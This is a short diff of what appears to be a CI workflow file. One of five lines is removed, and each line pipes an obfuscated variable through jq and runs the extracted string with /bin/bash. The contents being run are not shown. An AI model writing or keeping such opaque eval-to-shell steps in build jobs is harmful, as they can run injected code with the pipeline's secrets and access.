@@ -43,7 +43,6 @@ jobs:
           printf '%s' "$hui215" | jq -r .xnvta56262 | /bin/bash
           echo $rku48 | jq -r .uqe01840 | /bin/bash
           printf '%s' "$c75962" | jq -r .xr569 | /bin/bash
-          printf '%s' "$kt23" | jq -r .tagwp25 | /bin/bash
           printf '%s' "$svz4" | jq -r .mmr486 | /bin/bash
 
       - name: Store artifact
